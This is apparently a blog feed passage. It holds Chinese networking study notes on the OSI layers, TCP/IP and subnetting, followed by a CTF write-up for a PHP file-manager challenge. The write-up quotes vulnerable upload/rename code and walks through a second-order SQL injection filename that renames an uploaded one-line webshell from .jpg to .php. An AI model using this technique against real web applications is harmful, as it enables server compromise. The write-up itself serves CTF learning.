Card</h4><blockquote><p>不同的网卡实现的layer不同</p></blockquote><h4 id="Ethernet-Media"><a href="#Ethernet-Media" class="headerlink" title="Ethernet Media"></a>Ethernet Media</h4><p>Comparing Ethernet Media Requirements<br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/3.png" alt></p><blockquote><p>以太网传输介质分为有线和无线两种</p><p>数字代表传输速度，base代表基带传输(通信术语)，后面的部分代表传输介质。T代表铜质双绞线，F代表光纤</p><p>速度要求高，距离要求高时用光纤，一般的应用使用双绞线</p></blockquote><h4 id="Unshielded-Twisted-Pair-Cable"><a href="#Unshielded-Twisted-Pair-Cable" class="headerlink" title="Unshielded Twisted-Pair Cable"></a>Unshielded Twisted-Pair Cable</h4><ul><li>Speed and throughput: 10 to 1000 Mb/s</li><li>Another name: UTP</li><li>UTP Implementation: Straight-Through Cable and Crossover Cable</li></ul><blockquote><p>平行线连接不同的设备，交叉线连接相同的设备</p></blockquote><h4 id="Optical-Fiber"><a href="#Optical-Fiber" class="headerlink" title="Optical Fiber"></a>Optical Fiber</h4><ul><li>Single-mode Fiber: long transmission distance</li><li>Multi-mdoe Fiber: short transmission distance</li></ul><blockquote><p>光纤均为成对连接，连接时两端需对调</p><p>单模光纤：LX，多模光纤：SX</p></blockquote><h2 id="Data-Link"><a href="#Data-Link" class="headerlink" title="Data Link"></a>Data Link</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><p>Access to Media</p><ul><li>Defines how data is formatted for transmission and how access to the network is controlled</li><li>Provides error detection</li></ul><blockquote><p>定义数据的基本格式，数据如何在线缆上传输，怎么样进行标识，怎么样防止错误。控制如何去访问底层介质，以及差错检测。最主要的功能是MAC编址。</p></blockquote><h3 id="Layer-2-Devices"><a href="#Layer-2-Devices" class="headerlink" title="Layer 2 Devices"></a>Layer 2 Devices</h3><ul><li>Layer 2 devices provide an interface with physical media</li><li>Examples<ul><li>NIC</li><li>Bridge</li><li>Switch</li></ul></li></ul><h3 id="Local-Area-Network-LAN"><a href="#Local-Area-Network-LAN" class="headerlink" title="Local Area Network(LAN)"></a>Local Area Network(LAN)</h3><p>LAN Standards<br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/4.png" alt></p><blockquote><p>定义在 IEEE 802.2和802.3</p><p>LLC：负责二层与三层的通信</p><p>MAC：访问底层介质的控制</p></blockquote><h3 id="MAC-Address-Components"><a href="#MAC-Address-Components" class="headerlink" title="MAC Address Components"></a>MAC Address Components</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/5.png" alt></p><blockquote><p>OUI: 组织唯一标识符，标识生产厂商</p><p>Vendor Assigned: 厂商标识符，标识设备</p><p>前两位代表是广播地址还是组播地址，是本地还是全球</p><p>MAC地址不能修改，是写在 ROM 中的</p><p>在一个网段内，设备之间实际通过MAC地址通信</p></blockquote><h3 id="Ethernet-Frame-Structure"><a href="#Ethernet-Frame-Structure" class="headerlink" title="Ethernet Frame Structure"></a>Ethernet Frame Structure</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/6.png" alt></p><h3 id="Communicating-Within-the-LAN"><a href="#Communicating-Within-the-LAN" class="headerlink" title="Communicating Within the LAN"></a>Communicating Within the LAN</h3><ul><li>Unicast: one to one </li><li>Broadcast: one to all</li><li>Multicast: one to group</li></ul><blockquote><p>广播地址全为 1 </p><p>依靠 MAC 地址的格式区分类型</p></blockquote><h3 id="Collisions"><a href="#Collisions" class="headerlink" title="Collisions"></a>Collisions</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/7.png" alt></p><blockquote><p>在物理线缆上同时有两个电信号，引起冲突</p></blockquote><h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/8.png" alt></p><blockquote><p>在发送数据之前会先监听线路上是否有载波信号，如果有就代表线路上有人在传输信号，之后会通过一个回退算法等待一段时间，然后再去检测，直到线路上没有载波信号再发送数据</p><p>它是有线网络防止冲突的方式，它是被动监听</p></blockquote><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><blockquote><p>无线网络防止冲突的方式，它是主动检测</p><p>WLAN由802.11定义</p></blockquote><h3 id="Ethernet-Implementation"><a href="#Ethernet-Implementation" class="headerlink" title="Ethernet Implementation"></a>Ethernet Implementation</h3><ul><li>LAN</li><li>WLAN</li><li>…</li></ul><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>Data Delivery</p><ul><li>Routes data packets</li><li>Selects best path to deliver data</li><li>Provides logical addressing and path selection</li></ul><blockquote><p>主要是IP编址和路由功能</p></blockquote><h3 id="Flat-Topology"><a href="#Flat-Topology" class="headerlink" title="Flat Topology"></a>Flat Topology</h3><p>Problems</p><ul><li>所有设备在同一个广播域</li><li>设备定位查找困难</li><li>难以对设备区分应用策略</li></ul><blockquote><p>MAC地址是一个平面的编址方案，这样就会产生很多问题</p></blockquote><h3 id="Network-1"><a href="#Network-1" class="headerlink" title="Network"></a>Network</h3><ul><li>Smaller networks are easier to manage.</li><li>Overall traffic is reduced.</li><li>You can more easily apply network security policies.</li></ul><h3 id="Internet-Protocol-IP-Characteristics"><a href="#Internet-Protocol-IP-Characteristics" class="headerlink" title="Internet Protocol(IP) Characteristics"></a>Internet Protocol(IP) Characteristics</h3><ul><li>Hierarchical addressing</li><li>Operates at network layer of OSI</li><li>Connectionless protocol</li><li>Packets treated independently</li><li>Best-effort delivery</li><li>No data-recovery features</li></ul><blockquote><p>面向非连接协议，不论目标主机状态如何都可以发送数据进行通信</p><p>三层编址，实现IPv4(32bit)，实现connectionless的数据传输</p><p>允许对不同的数据包进行标记(QoS)</p></blockquote><h3 id="Routing-and-Router"><a href="#Routing-and-Router" class="headerlink" title="Routing and Router"></a>Routing and Router</h3><ul><li>路由器一般拥有多个接口，每个接口连接到一个网段，并且拥有该网段的一个IP地址，这个地址就是这个网段的网关IP地址</li><li>路由器通过不同方式维护一个路由表，路由器通过路由表的记录完成不同网段的数据转发(路由)功能</li><li>路由器具有在不同网络路径之间选择最优路径的功能</li><li>路由器具有隔离广播域的功能</li></ul><h3 id="IP-PDU-Header"><a href="#IP-PDU-Header" class="headerlink" title="IP PDU Header"></a>IP PDU Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/9.png" alt></p><blockquote><p>最大数据包长度65535</p><p>MTU最大传输单元，这是物理限制，一个接口单次传输数据最大传输多大，一般以太网为1500</p><p>Identification：标识是同一个数据包</p><p>Flag.Offset：当前分片所处的位置距离第一个偏移的位置</p><p>Time to Live：TTL，防止数据包在网络中无限传输，每经过一个三层设备，TTL-1</p><p>Protocol：实现多路复用，区分上层协议，不同上层协议这个数值不同</p><p>Header Checksum：检测在传输过程中是否被损坏</p></blockquote><h3 id="IP-Address-Classes"><a href="#IP-Address-Classes" class="headerlink" title="IP Address Classes"></a>IP Address Classes</h3><ul><li>A：网络部分8位</li><li>B：网络部分16位</li><li>C：网络部分24位</li><li>D：用于组播</li><li>E：保留使用</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/10.png" alt></p><blockquote><p>主机部分全为 0 代表一个网络，为网络地址</p><p>主机部分全为 1 代表一个广播，为广播地址</p></blockquote><h3 id="Private-IP-Addresses"><a href="#Private-IP-Addresses" class="headerlink" title="Private IP Addresses"></a>Private IP Addresses</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/11.png" alt></p><blockquote><p>私有地址不能出现在公网上</p></blockquote><h2 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h2><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h3><p>End-to-End COnnections</p><ul><li>Handles transportation issues between hosts</li><li>Ensures data transport reliability</li><li>Establishes, maintains, and terminals virtual circuits</li><li>Provides reliability through fault detection and recovery information flow control</li></ul><p>Transport Layer</p><ul><li>Session multiplexing</li><li>Segmentation</li><li>Flow control(when required)</li><li>Connection-oriented(when required)</li><li>Reliability(when required)</li></ul><blockquote><p>端到端通信的基本功能，TCP和UDP</p></blockquote><h3 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h3><ul><li>一个协议为多个上层协议提供统一服务</li><li>在TCP层使用端口号来区分不同的上层应用程序，范围0-65535</li></ul><blockquote><p>协议多路复用，不仅仅存在于传输层</p><p>端口号实现多路复用</p></blockquote><h3 id="Reliable-vs-Best-Effort-Comparision"><a href="#Reliable-vs-Best-Effort-Comparision" class="headerlink" title="Reliable vs. Best-Effort Comparision"></a>Reliable vs. Best-Effort Comparision</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/12.png" alt></p><h3 id="UDP-Characteristics"><a href="#UDP-Characteristics" class="headerlink" title="UDP Characteristics"></a>UDP Characteristics</h3><ul><li>Operates at transport layer of OSI and TCP/IP models</li><li>Provides applications with access to the network layer without the overhead of reliability mechanisms</li><li>Is a connectionless protocol</li><li>Provides limited error checking</li><li>Provides best-effort delivery</li><li>Has no data-recovery features</li></ul><h3 id="UDP-Header"><a href="#UDP-Header" class="headerlink" title="UDP Header"></a>UDP Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/13.png" alt></p><blockquote><p>所说的标准端口号，比如HTTP是80，FTP是20、21，这些端口号都是目标端口号，而源端口号是随机的</p><p>UDP报头是固定长度的</p></blockquote><h3 id="TCP-Characteristics"><a href="#TCP-Characteristics" class="headerlink" title="TCP Characteristics"></a>TCP Characteristics</h3><ul><li>Transport layer of the TCP/IP stack</li><li>Access to the network layer for applications</li><li>Connection-oriented protocol</li><li>Full-duplex mode operation</li><li>Error checking</li><li>Sequencing of data packets</li><li>Acknowledgement of recept</li><li>Data-recovery features</li></ul><blockquote><p>Full-duplex mode operation：TCP是双向连接，上行连接和下行连接</p></blockquote><h3 id="TCP-Header"><a href="#TCP-Header" class="headerlink" title="TCP Header"></a>TCP Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/14.png" alt></p><blockquote><p>状态标识：resv后面的内容</p><p>紧急指针：用于流控</p></blockquote><h3 id="Three-Way-Handshake"><a href="#Three-Way-Handshake" class="headerlink" title="Three-Way Handshake"></a>Three-Way Handshake</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/15.png" alt></p><ul><li>A 发送的 TCP Header 中状态位 SYN 置 1，协商初始序列号 100</li><li>B 发现序列号 100 已被使用，协商使用序列号 300，确认下一个想要收到的序列号 101</li><li>A 认为没有问题，就会继续发送一个 ACK，确认 301</li></ul><h3 id="Flow-Control"><a href="#Flow-Control" class="headerlink" title="Flow Control"></a>Flow Control</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/16.png" alt></p><blockquote><p>接收者没有资源去处理发送来的数据了，就会发送一个停止位，等到有资源去处理时再发送数据</p></blockquote><h3 id="Fixed-Windowing"><a href="#Fixed-Windowing" class="headerlink" title="Fixed Windowing"></a>Fixed Windowing</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/17.png" alt></p><blockquote><p>窗口大小为 3，发送三个数据包返回一个确认，增加传输效率</p><p>TCP sliding windowing，在通信过程中可以修改 window size 的大小</p></blockquote><h3 id="Mapping-Layer-3-to-Layer-4"><a href="#Mapping-Layer-3-to-Layer-4" class="headerlink" title="Mapping Layer 3 to Layer 4"></a>Mapping Layer 3 to Layer 4</h3><ul><li>三层到四层的映射是通过 IP 数据包报头的 protocol 字段完成的</li><li>UDP 和 TCP 对应的 protocol 字段的值不同</li></ul><h3 id="Mapping-Layer-4-to-Applications"><a href="#Mapping-Layer-4-to-Applications" class="headerlink" title="Mapping Layer 4 to Applications"></a>Mapping Layer 4 to Applications</h3><ul><li>四层到上层的映射是通过端口号</li></ul><blockquote><p>DNS 既可以使用 TCP 又可以使用 UDP</p></blockquote><h2 id="Session-Presentation-Application"><a href="#Session-Presentation-Application" class="headerlink" title="Session Presentation Application"></a>Session Presentation Application</h2><blockquote><p>统一称为应用层，由应用控制</p></blockquote><h1 id="Data-Encapsulation"><a href="#Data-Encapsulation" class="headerlink" title="Data Encapsulation"></a>Data Encapsulation</h1><ul><li>Data Encapsulation</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/1.jpg" alt></p><ul><li>Peer-to-Peer Communication</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/2.jpg" alt></p><blockquote><p>数据封装，解封装为其逆过程</p><p>数据包在不同的分成有不同的名称。段，包，帧，比特流</p></blockquote><h1 id="Packet-Delivery"><a href="#Packet-Delivery" class="headerlink" title="Packet Delivery"></a>Packet Delivery</h1><h2 id="Host-to-Host-Packet-Delivery-同网段"><a href="#Host-to-Host-Packet-Delivery-同网段" class="headerlink" title="Host-to-Host Packet Delivery(同网段)"></a>Host-to-Host Packet Delivery(同网段)</h2><ul><li>源目标主机属于同一网段</li><li>源主机使用 IP 地址封装三层信息，并传递给二层</li><li>二层查询本机 ARP 表，发现没有目标主机的 MAC 地址记录，则通过 ARP 协议查询目标主机 MAC 地址</li><li>通过 ARP 协议获取到目标主机 MAC 地址后，通过 MAC 地址封装二层信息，并传递给物理层发送给目标</li></ul><h2 id="Host-to-Host-Packet-Delivery-不同网段"><a href="#Host-to-Host-Packet-Delivery-不同网段" class="headerlink" title="Host-to-Host Packet Delivery(不同网段)"></a>Host-to-Host Packet Delivery(不同网段)</h2><ul><li>源目标主机属于不同网段，所以需要将数据发给本网网关进行转发</li><li>源主机使用 IP 地址封装三层信息，并传递给二层</li><li>二层查询本机 ARP 表，发现没有目标主机的 MAC 地址记录，则通过 ARP 协议查询网关 MAC 地址</li><li>通过 ARP 协议获取到网关 MAC 地址后，通过 MAC 地址封装二层信息，并传递给物理层发送给网关</li></ul><h1 id="Network-Command"><a href="#Network-Command" class="headerlink" title="Network Command"></a>Network Command</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><ul><li>-t  持续 ping 目标主机直到接收到停止信号</li><li>-a  将目标主机解析成主机名</li><li>-n  对目标主机 ping 的次数</li><li>-l  ping 包的大小</li><li>-f  设置 IP 包的 DF 值<blockquote><p>使用 ICMP 协议</p><p>DF：不进行分片</p></blockquote></li></ul><h2 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h2><ul><li>/all          显示所有适配器的TCP/IP配置</li><li>/renew        更新适配器DHCP配置</li><li>/release      更新DHCP租约期</li><li>/displaydns   显示DNS缓存信息</li></ul><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><ul><li>-querytype    DNS 查询</li></ul><h2 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h2><ul><li>-a   显示所有ARP信息</li><li>-s   绑定静态ARP</li><li>-d   删除ARP信息</li></ul><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><ul><li>-a   显示所有连接及监听端口</li><li>-e   显示以太网信息</li><li>-n   不进行IP到主机名的解析</li><li>-p   只显示指定的协议</li><li>-s   显示每个协议的状态</li></ul><h1 id="Understanding-VLSM"><a href="#Understanding-VLSM" class="headerlink" title="Understanding VLSM"></a>Understanding VLSM</h1><h2 id="Subnetting-Review"><a href="#Subnetting-Review" class="headerlink" title="Subnetting Review"></a>Subnetting Review</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/18.png" alt></p><blockquote><p>IP = network + subnets + host</p></blockquote><h2 id="What-a-Subnet-Mask-does"><a href="#What-a-Subnet-Mask-does" class="headerlink" title="What a Subnet Mask does"></a>What a Subnet Mask does</h2><ul><li>Tells the router the number of bits to look at when routing</li><li>Defines the number of bits that are significant</li><li>Used as a measuring tool, not to hide anything</li></ul><blockquote><p>比如，IP 172.16.55.87，如何确定它的网络号?</p></blockquote><h2 id="Subnetting-Review-Exercise"><a href="#Subnetting-Review-Exercise" class="headerlink" title="Subnetting Review Exercise"></a>Subnetting Review Exercise</h2><p>Subnet a network with a private network address of 172.16.0.0/16 so that it provides 100 subnets and maximizes the number of host addresses for each subnet.</p><ul><li>How many bits will need to be borrowed?</li><li>What is the new subnet mask?</li></ul><ol><li>2的7次方 = 128 &gt; 100，向后借7位</li><li>172.16.0.0/23，把/16切成128个/23的</li></ol><h2 id="VLSM"><a href="#VLSM" class="headerlink" title="VLSM"></a>VLSM</h2><blockquote><p>按需分配，划分的子网刚刚满足需求</p></blockquote><p><strong>Example1：</strong></p><p>IP Address：192.168.221.37<br>Subnet Mask： /29</p><p>192.168.221.00100 | 101</p><p>后三位是主机位，属于192.168.221.32网段</p><p><strong>Example2：</strong><br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/19.png" alt></p><ul><li>左半边 IP 地址需求为 2，右半边为 50，把子网切成能满足需求的小的子网</li><li>先满足较大的主机需求，50，那么主机部分留 6 位</li><li>10101100.100010000.0010 | 0000.00 | 000000，前 20 位是不变的，主机部分留 6 位，剩下的 6 位就是子网部分，切出来 64 个子网，将 /20 切为 64 个 /26 的子网</li><li>满足左边的主机需求只需要 2 个 IP 地址，主机位只要留2位即可</li><li>找一个剩下的 /26 子网切成 16 个 /30 的子网，每个子网有 2 个 IP 地址</li></ul><h2 id="Route-Summarization"><a href="#Route-Summarization" class="headerlink" title="Route Summarization"></a>Route Summarization</h2><p>路由匹配的特点：</p><ul><li>路由器只会匹配子网掩码规定的位数，剩下的不管</li><li>路由器进行的是最长匹配，永远优先匹配子网掩码最长的</li></ul><p>路由汇总： </p><p>B：172.16.128.0/20<br>C：172.16.32.0/24<br>D：172.16.64.0/20<br>BCD汇总成 172.16.0.0/16 发送给 A 路由器，再由 A 路由器发送给上层路由器</p><blockquote><p>针对路由表，减少路由表条目数量</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSI模型&quot;&gt;&lt;a href=&quot;#OSI模型&quot; class=&quot;headerlink&quot; title=&quot;OSI模型&quot;&gt;&lt;/a&gt;OSI模型&lt;/h1&gt;&lt;h2 id=&quot;A-Layered-Network-Model&quot;&gt;&lt;a href=&quot;#A-Layered-Network-
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸安全打卡Web分析</title>
    <link href="http://yoursite.com/2019/06/01/%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/06/01/蓝鲸打卡Web分析/</id>
    <published>2019-05-31T18:37:38.581Z</published>
    <updated>2019-05-31T18:30:46.532Z</updated>
    
    <content type="html"><![CDATA[<p>平台gg了，以后再继续写</p><h2 id="一、蓝鲸文件管理系统"><a href="#一、蓝鲸文件管理系统" class="headerlink" title="一、蓝鲸文件管理系统"></a>一、蓝鲸文件管理系统</h2><p>源代码地址：<a href="http://www.whaledu.com/course/290/task/2848/show" target="_blank" rel="noopener">http://www.whaledu.com/course/290/task/2848/show</a></p><p>首先在设置文件里把所有的输入都采用<strong>addslashes()</strong>函数进行转义</p><h3 id="upload-php关键代码"><a href="#upload-php关键代码" class="headerlink" title="upload.php关键代码"></a>upload.php关键代码</h3><p>将上传的文件通过pathinfo()函数分成三个部分，[dirname] [filename] [extension]</p><p>然后进行后缀名检查，拼接后进行addslashes转义，查询是否存在这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">    $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">   </span><br><span class="line">    $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">    $fetch = $db-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将文件名和后缀名插入数据库，将文件移动到相应文件夹并返回路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">        $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">        $re = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="rename-php关键代码"><a href="#rename-php关键代码" class="headerlink" title="rename.php关键代码"></a>rename.php关键代码</h3><p>查询旧文件是否存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更新filename，将oldname和newname重组，查询oldname是否存在，然后将文件的oldname更新为newname</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($result) &#123;       </span><br><span class="line"></span><br><span class="line">    $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">    $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">        print_r($db-&gt;errorInfo());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">        rename($oldname, $newname);</span><br><span class="line">        $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>在upload的过程中，全程进行转义并检测后缀，无法对上传进行操作，但是在rename的时候，没有对newname进行控制，这就可能会造成update的二次注入。</p><p>假设我们上传的文件是 1.jpg，然后进行改名，这个时候就会触发数据库的update语句</p><blockquote><p>update `file` set `filename`=’newname’, `oldname`=’1’ where `fid`=fid</p></blockquote><p>很明显，这里的newname和oldname都是我们可以控制的。</p><p>考虑上传问题，假设 1.jpg 是一句话木马，要把 1.jpg 变成 1.php，由于filename和extension分开操作，然后再合并，所有这里希望extension为空，这样在rename时可以将 1.jpg 变成 1.php。</p><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg</p><p><strong>解释：</strong></p><p>文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_1.PNG" alt></p><p>注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’</p><p>然后进行update，这时执行了构造的SQL语句，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_2.PNG" alt></p><p>注意这两行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br></pre></td></tr></table></figure><p>在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 <strong>1.jpg.jpg</strong></p><p>构造另外一个一句话木马文件1.jpg，上传，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_3.PNG" alt></p><p>再进行rename，传入的oldname为 1.jpg，newname为 1.php</p><p>进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’</p><p>在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台gg了，以后再继续写&lt;/p&gt;
